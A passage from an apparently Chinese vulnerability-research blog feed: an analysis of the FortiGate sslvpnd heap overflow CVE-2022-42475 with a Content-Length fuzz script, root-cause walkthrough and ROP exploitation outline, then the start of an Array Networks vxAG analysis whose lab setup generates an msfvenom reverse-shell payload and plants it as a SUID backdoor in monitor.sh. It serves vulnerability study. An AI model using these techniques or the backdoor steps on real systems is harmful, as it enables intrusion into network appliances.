class="line">  <span class="keyword">if</span> ( !byte_A8AC620 )</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  sub_1777590(v4, a1, a2, a3);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 7.2.3 中对应函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1776E60</span><span class="params">(<span class="type">unsigned</span> __int64 a1, __int64 a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x40000000</span> )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  v5 = je_malloc();</span><br><span class="line">  v3 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_16CFB30(<span class="number">0</span>, <span class="number">8</span>, <span class="string">&quot;malloc(%ld) calling from %s:%d failed.\n&quot;</span>, a1, a2, a3);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  ++qword_A8AD770;</span><br><span class="line">  <span class="keyword">if</span> ( !byte_A8AD780 )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  sub_17777D0(v5, a1, a2, a3);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们发现新版本的内存分配相关函数中都添加了对 size 的判断，要求其不能大于 0x40000000</p>
<p>考虑到该漏洞是一个堆内存溢出，根据修复方式推测漏洞的根本原因可能是某处发生整数溢出，导致内存分配函数返回了一块较小的内存，而后续拷贝数据时又使用了较大的 size。</p>
<p>而在 HTTP 请求中可能有两种情况会导致以上结果，一是某些功能 handler 函数中对用户提交的参数验证不严格，或者代码在解析请求时对 Content-Length 的解析出现异常。</p>
<p>sslvpn 中在未授权情况下能够访问的功能点不多，漏洞出现在请求解析阶段可能性比较大。sslvpnd 是基于 Apache httpd 修改而来，开发者在其中添加了很多自定义代码，导致复杂度较高，而且程序不包含符号信息，分析起来会消耗很多时间。</p>
<p>我们可以采取更简单的方法，基于补丁分析和推测，漏洞可能发生在解析请求，特别是处理 Content-Length 阶段。那么只需要按照 fuzz HTTP 协议的思路，构造一些带有畸形 Content-Length 的请求，例如 CL 过大、或者等于负数的情况，将这些请求发送到能够未授权访问的接口中，同时检测 web 服务状态，发生崩溃或无法收到响应时记录下对应的请求报文。</p>
<p>编写出测试脚本：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/remote/login&quot;</span>.encode()</span><br><span class="line">content_length = [<span class="string">&quot;0&quot;</span>, <span class="string">&quot;-1&quot;</span>, <span class="string">&quot;2147483647&quot;</span>, <span class="string">&quot;2147483648&quot;</span>, <span class="string">&quot;-0&quot;</span>, <span class="string">&quot;4294967295&quot;</span>, <span class="string">&quot;4294967296&quot;</span>, <span class="string">&quot;1111111111111&quot;</span>, <span class="string">&quot;22222222222&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> CL <span class="keyword">in</span> content_length:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = <span class="string">b&quot;POST &quot;</span> + path + <span class="string">b&quot; HTTP/1.1\r\nHost: 192.168.232.129\r\nContent-Length: &quot;</span> + CL.encode() + <span class="string">b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;</span></span><br><span class="line">        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        _socket.connect((<span class="string">&quot;192.168.232.129&quot;</span>, <span class="number">4443</span>))</span><br><span class="line">        _default_context = ssl._create_unverified_context()</span><br><span class="line">        _socket = _default_context.wrap_socket(_socket)</span><br><span class="line">        _socket.sendall(data)</span><br><span class="line">        res = _socket.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;HTTP/1.1&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error detected&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(CL)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error detected&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(CL)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p>运行后当发送 CL 等于 2147483647 时服务器没有响应，手动测试结果也一致。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-4.png"
                     
                ></p>
<p>挂载调试器尝试捕获异常信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-5.png"
                     
                ></p>
<p>发包之后产生段错误，访问 rdi 时遇到非法地址。通过栈回溯分析其调用信息，最终找到了关键函数 read_post_data</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_post_data</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v1; <span class="comment">// r12</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// er12</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  __int64 content_length; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// er12</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// er12</span></span><br><span class="line"></span><br><span class="line">  v1 = *(a1 + <span class="number">736</span>);</span><br><span class="line">  v2 = get_req(*(a1 + <span class="number">664</span>));</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( !*(v2 + <span class="number">8</span>) )</span><br><span class="line">    *(v2 + <span class="number">8</span>) = pool_alloc(*v1, *(v2 + <span class="number">24</span>) + <span class="number">1</span>);    <span class="comment">// Content-Length</span></span><br><span class="line">  v4 = unknow_0(v1, v3 + <span class="number">32</span>, <span class="number">8190LL</span>);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( unknow_1(*(a1 + <span class="number">616</span>)) - <span class="number">1</span> &lt;= <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *(v3 + <span class="number">16</span>);</span><br><span class="line">      content_length = *(v3 + <span class="number">24</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 + v4 &gt; content_length )</span><br><span class="line">        v5 = *(v3 + <span class="number">24</span>) - v6;</span><br><span class="line">      <span class="keyword">if</span> ( content_length &gt; v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((*(v3 + <span class="number">8</span>) + v6), (v3 + <span class="number">32</span>), v5);</span><br><span class="line">        v10 = *(v3 + <span class="number">24</span>);</span><br><span class="line">        v11 = *(v3 + <span class="number">16</span>) + v5;</span><br><span class="line">        *(v3 + <span class="number">16</span>) = v11;</span><br><span class="line">        <span class="keyword">if</span> ( v11 &lt; v10 )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v8 = *(v3 + <span class="number">16</span>) + v5;</span><br><span class="line">        *(v3 + <span class="number">16</span>) = v8;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &lt; content_length )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数负责从 POST 请求体中读取输入，其基本逻辑：首先获取到用户提交的 Content-Length 值，传入 pool_alloc 函数中分配内存空间，之后使用 memcpy 将用户数据拷贝到刚刚分配的内存中。</p>
<p>问题就出在 pool_alloc 参数上面，查看汇编指令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     eax, [rax+18h]</span><br><span class="line">mov     rdi, [r12]</span><br><span class="line">lea     esi, [rax+1]</span><br><span class="line">movsxd  rsi, esi</span><br><span class="line">call    pool_alloc</span><br></pre></td></tr></table></figure></div>

<p>rax 为用户请求结构体指针，偏移位置 0x18 存放了 CL 值。先将 CL 放在 eax 寄存器中，使用 lea 指令将其加一后放在 esi 寄存器，再用 movsxd 扩展为 64 bit 值。结合调试信息就可以看到程序为何崩溃。</p>
<p>在 fuzz 脚本中传入 CL &#x3D; 2147483647，换成 hex 为 0x7fffffff，经过上面的运算当传入 pool_alloc 时寄存器情况：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-6.png"
                     
                ></p>
<p>pool_alloc 函数的伪代码:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_164E590</span><span class="params">(__int64 a1, <span class="type">size_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a1 + <span class="number">8</span>);</span><br><span class="line">  v3 = v2[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">8LL</span> * (((a2 - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( &amp;v3[v4] &gt; *v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = dword_A8AC5A4 - <span class="number">25</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &lt; v4 )</span><br><span class="line">        v7 = <span class="number">8LL</span> * (((a2 - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">      v8 = malloc_block(v7);</span><br><span class="line">      *(*(a1 + <span class="number">8</span>) + <span class="number">8LL</span>) = v8;</span><br><span class="line">      *(a1 + <span class="number">8</span>) = v8;</span><br><span class="line">      v3 = *(v8 + <span class="number">16</span>);</span><br><span class="line">      *(v8 + <span class="number">16</span>) = &amp;v3[v4];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2[<span class="number">2</span>] = &amp;v3[v4];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(v3, <span class="number">0</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>传入数据参与补齐运算，然后判断在 v3 数组中对应位置是否存在内容，不存在则直接调用 memset 返回，而当调用 memset 时参数情况：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-7.png"
                     
                ></p>
<p>length 部分变成一个非常大的数值，这样会导致 memset 访问到非法内存使程序崩溃。</p>
<p>考察漏洞根本原因，在调用 pool_alloc 函数时使用 32 位数值 + 1 拓展成 64 位的方法，这里存在整数溢出。那么我们可以构造特殊的 CL 值，比如 0x1b00000000，经过运算拓展之后会变成 0x1，在 pool_alloc 内部调用 memset 时情况：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-8.png"
                     
                ></p>
<p>缓冲区是位于 heap 的一块较小内存，而 size 已经变成 0x1。</p>
<p>这样 pool_alloc 返回了一块较小的堆内存，假设此时我们在 POST 请求体中构造了超长的数据，那么在后续的 memcpy 阶段就会导致堆内存溢出。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-9.png"
                     
                ></p>
<p>某些情况下能够得到如下 crash</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-10.png"
                     
                ></p>
<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>对于 FortiGate 堆溢出的利用，DEVCORE 曾介绍过思路：<a class="link"   href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/" >https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>传统堆溢出利用需要结合堆相关的管理逻辑，通过精心控制堆块排布来控制程序执行流。但正如 DEVCORE 文章和我们 fuzz 结果显示，在 FortiGate 上堆溢出会覆盖堆中某些关键结构体中的数据，具体来说是 HTTP 请求的 SSL 结构体指针。在触发漏洞之前先发送很多正常的 HTTP 请求，这样在堆中就会留下很多 SSL 结构，再触发堆溢出去覆盖这些结构体，当程序调用被覆盖的结构体中 handshake_func 指针时，我们就能直接劫持程序控制流。</p>
<p>观察崩溃现场，rdx 寄存器指向可控内存，我们可以在程序中找到 <code>push rdx ; pop rsp</code> 的 gadget，将 stack 迁移到可控内存中，将堆溢出转换成 ROP，直接执行 system(‘cmd’) 即可。</p>
<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>新版的 read_post_data 调用 pool_alloc 时代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     rax, [rax+18h]</span><br><span class="line">mov     rdi, [r12]</span><br><span class="line">lea     rsi, [rax+1]</span><br><span class="line">call    pool_alloc</span><br></pre></td></tr></table></figure></div>

<p>不再使用 32 位寄存器拓展，并且分配内存时会检查 size 大小。</p>
<h2 id="参考文章-x2F-拓展阅读"><a href="#参考文章-x2F-拓展阅读" class="headerlink" title="参考文章&#x2F;拓展阅读"></a>参考文章&#x2F;拓展阅读</h2><p><a class="link"   href="https://www.cnblogs.com/studyskill/p/6524672.html" >FortiOS 5.4 后门植入<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>DEVCORE 关于 FortiGate 堆溢出漏洞利用的<a class="link"   href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/" >文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>2023 年 1 月 11 日，Fortinet 官方发布了关于积极利用该漏洞的组织，以及他们所使用工具的<a class="link"   href="https://www.fortinet.com/blog/psirt-blogs/analysis-of-fg-ir-22-398-fortios-heap-based-buffer-overflow-in-sslvpnd" >分析文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>2023 年 5 月 17 日，BishopFox 发布了一种更完整的利用此漏洞的<a class="link"   href="https://bishopfox.com/blog/exploit-cve-2022-42475" >文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Array Networks vxAG 远程代码执行漏洞分析 (一)</title>
    <url>/2022/11/16/ArrayVPN_rce/</url>
    <content><![CDATA[<p>2022 年 Array Networks 官方发布了数个影响 AG&#x2F;vxAG 设备的远程代码执行漏洞公告，官方披露信息较少，难以界定本文提到的漏洞和公告中的是否一致，因此文章内容仅供参考。由于环境配置和漏洞分析利用较为复杂，所以文章将分为两部分，本文为第一部分。(分析版本基于 9.4.0.5)</p>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>镜像下载链接：<a class="link"   href="https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/vxag.html" >vxAG<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>得到镜像之后导入 Vmware 开机，等待启动完成会提示输入账户登录，默认账户为 array:admin。登录到 CLI，先配置网络，相关命令：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enable</span><br><span class="line">&lt;提示输入密码，直接回车&gt;</span><br><span class="line">configure terminal</span><br><span class="line">ip address port1 192.168.0.151 255.255.255.0</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></div>

<p>配置好之后浏览器访问链接 <a class="link"   href="https://192.168.0.151:8888/" >https://192.168.0.151:8888<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 使用默认账户登录即可。</p>
<h2 id="代码和权限获取"><a href="#代码和权限获取" class="headerlink" title="代码和权限获取"></a>代码和权限获取</h2><p>网络配置完毕，我们需要拿到文件系统以便于进行代码审计分析。获取代码采用比较常规的思路，即尝试将虚拟机磁盘挂载出来，拷贝文件系统或植入后门。</p>
<p>先关闭虚拟机，卸载磁盘，然后将磁盘挂载到另一台 Linux 虚拟机上，可以识别到以下分区</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag_01.png"
                      alt="img"
                ></p>
<p>不过尝试点击分区打开时，会出现错误信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag_02.png"
                      alt="img"
                ></p>
<p>这是因为 vxAG 是基于 FreeBSD 系统开发的，FreeBSD 使用 UFS 文件系统，Linux 对 UFS 的识别可能存在一些问题，我们尝试用 mount 命令挂载</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">sudo mount -r -t ufs -o ufstype=ufs2 /dev/sdb10 ./sdb10</span><br></pre></td></tr></table></figure></div>

<p>这样就可以挂载成功，业务相关程序位于 &#x2F;dev&#x2F;sdb7 中，先将文件打包到本地。</p>
<p>由于设备不提供 root shell，为了方便后续调试需要在系统中植入后门，不过直接从 Linux 上没办法修改 UFS 文件系统，如果想修改，需要安装一系列工具和内核驱动模块，其过程比较复杂且存在失败风险。我们可以采取更好的方案，安装一份 FreeBSD 系统，将磁盘挂载到此系统即可进行读写操作。</p>
<p>FreeBSD 7.0 的下载<a class="link"   href="http://ftp-archive.freebsd.org/pub/FreeBSD-Archive/old-releases/amd64/ISO-IMAGES/7.0/" >链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，下载 disc1 即可，安装过程参考<a class="link"   href="https://wenku.baidu.com/view/c2b9c8adbfeb19e8b8f67c1cfad6195f312be8ca.html?_wkts_=1668560150325&bdQuery=freebsd+7.0+%E5%AE%89%E8%A3%85" >手册<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>进入 FreeBSD 系统先修改 &#x2F;etc&#x2F;ssh&#x2F;sshd_config 配置文件，添加 PermitRootLogin yes 选项允许 root 用户登录，关机将磁盘挂载上去，开机从 ssh 登录。挂载目标磁盘时应使用 IDE 类型。</p>
<p>在 &#x2F;dev 目录下可以看到 ad0 设备，对应目标硬盘。文件系统位于 ad0s1e 分区中，使用下面的命令将分区挂载到本地</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">fsck -y /dev/ad0s1e    <span class="comment"># 首先清理磁盘</span></span><br><span class="line">mount /dev/ad0s1e ./test     <span class="comment"># 将磁盘挂载到本地目录</span></span><br></pre></td></tr></table></figure></div>

<p>植入后门时我们希望对系统的改动最小，不影响正常功能，经分析发现位于 &#x2F;ca&#x2F;bin 目录下的 monitor.sh 脚本在执行 CLI 命令 debug monitor 时会被调用，可以考虑在这个脚本开头加入一些后门命令。</p>
<p>利用 msf 生成木马文件</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p bsd/x64/shell_reverse_tcp LHOST=192.168.0.161 LPORT=12345 -f elf &gt; my_shell</span><br></pre></td></tr></table></figure></div>

<p>把木马放在 &#x2F;ca&#x2F;bin 目录下，赋予 SUID 权限，然后在 monitor.sh 开头添加启动命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ca/bin/my_shell &amp;</span><br></pre></td></tr></table></figure></div>
<p>另外，可以将 &#x2F;etc&#x2F;master.passwd 中的 root 密码修改成已知的，方便后续操作。</p>
<p>保存修改卸载磁盘，将磁盘重新挂载回 array 系统上，开机进入 CLI，先在接收端监听端口，然后执行下面的命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enable</span><br><span class="line">configure terminal</span><br><span class="line">debug monitor off</span><br><span class="line">debug monitor on</span><br></pre></td></tr></table></figure></div>

<p>在接收端收到反弹 shell：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag_03.png"
                      alt="img"
                ></p>
<p>在命令行中执行</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pw user mod array -g wheel</span><br></pre></td></tr></table></figure></div>

<p>允许 array 用户使用 su 切换，然后执行命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /ca/bin/ca_shell /ca/bin/ca_shell_bak</span><br><span class="line">ln -s /bin/csh /ca/bin/ca_shell</span><br></pre></td></tr></table></figure></div>

<p>从 ssh 以 array 用户身份登录，再 su 切换到 root 用户即可得到完整的 shell 环境。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag_04.png"
                      alt="img"
                ></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>本文要介绍的漏洞位于设备 DesktopDirect 功能上，根据官方描述，这是一个类似 VPN 的远程接入功能，允许企业员工在任何地点的任何设备上安全的接入公司网络。这个功能默认运行在 TCP 9090 端口上，对应二进制程序 art_server。</p>
<p>art_server 是一个基于 lighttpd 开发的 web 服务程序，对应配置文件 &#x2F;ca&#x2F;bin&#x2F;art_server.conf，我们直接对它逆向分析。</p>
<p>程序包含符号信息，加上 lighttpd 源码辅助可以快速对功能点进行定位，我们找到关键入口函数 mod_art_server_uri_handler，这个函数会根据用户的请求 URI 调用不同功能，URI 包括</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/smx</span><br><span class="line">/prequery</span><br><span class="line">/query</span><br><span class="line">/object</span><br><span class="line">/portal</span><br><span class="line">/replication</span><br><span class="line">/test</span><br></pre></td></tr></table></figure></div>
<p>每个 URI 对应不同函数，大部分操作都是对本地 sqlite 数据库 &#x2F;ca&#x2F;bin&#x2F;artdb 的增删改查，举例来说，路由 &#x2F;replication 下包含几个子路由 &#x2F;groupinfo、&#x2F;notification、&#x2F;join 等，其中 &#x2F;groupinfo 对应函数 handle_replication_group_info_req 的部分代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">  xmlBuf = <span class="number">0LL</span>;</span><br><span class="line">  reqDoc = <span class="number">0LL</span>;</span><br><span class="line">  repDoc = <span class="number">0LL</span>;</span><br><span class="line">  db = <span class="number">0LL</span>;</span><br><span class="line">  peers = <span class="number">0LL</span>;</span><br><span class="line">  groupID = <span class="number">0LL</span>;</span><br><span class="line">  res = <span class="number">0LL</span>;</span><br><span class="line">  prmCon-&gt;http_status = <span class="number">500</span>;</span><br><span class="line">  data = get_post_content(prmData, prmServer, prmCon, <span class="number">1</span>);</span><br><span class="line">  reqDoc = xmlParseMemory(data-&gt;ptr, data-&gt;used);</span><br><span class="line">  <span class="keyword">if</span> ( !reqDoc )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to parse request (1)&quot;</span>, <span class="string">&quot;handle_replication_group_info_req&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  root = xmlDocGetRootElement(reqDoc);</span><br><span class="line">  <span class="keyword">if</span> ( !root )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to parse request (2)&quot;</span>, <span class="string">&quot;handle_replication_group_info_req&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( reqNode = root-&gt;children; reqNode &amp;&amp; <span class="built_in">strcmp</span>(reqNode-&gt;name, <span class="string">&quot;GroupInfoRequest&quot;</span>); reqNode = reqNode-&gt;next )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( !reqNode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to parse request (3)&quot;</span>, <span class="string">&quot;handle_replication_group_info_req&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  ret = artdb_open(&amp;db, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ret )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) Failed to get replication information (1)&quot;</span>, <span class="string">&quot;handle_replication_group_info_req&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  repDoc = xmlNewDoc(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">  root = xmlNewNode(<span class="number">0LL</span>, <span class="string">&quot;ART_REP&quot;</span>);</span><br><span class="line">  xmlDocSetRootElement(repDoc, root);</span><br><span class="line">  repNode = xmlNewChild(root, <span class="number">0LL</span>, <span class="string">&quot;GroupInfoReply&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  ret = artdb_rep_get_group_id(db, &amp;groupID);</span><br><span class="line">  <span class="keyword">if</span> ( ret )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) Failed to get replication group ID (%d)&quot;</span>, <span class="string">&quot;handle_replication_group_info_req&quot;</span>, ret);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( groupID )</span><br><span class="line">    xmlNewProp(repNode, &amp;off_6F0BED, groupID);</span><br><span class="line">  ret = artdb_get_version(db, &amp;dbVerMaj, &amp;dbVerMin, &amp;dbBuild);</span><br><span class="line">  <span class="keyword">if</span> ( ret )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(</span><br><span class="line">        <span class="number">1u</span>,</span><br><span class="line">        <span class="number">1u</span>,</span><br><span class="line">        <span class="string">&quot;(%s) Failed to get ART server version information (%d)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;handle_replication_group_info_req&quot;</span>,</span><br><span class="line">        ret);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sprintf</span>(st, <span class="string">&quot;%d&quot;</span>, dbVerMaj);</span><br><span 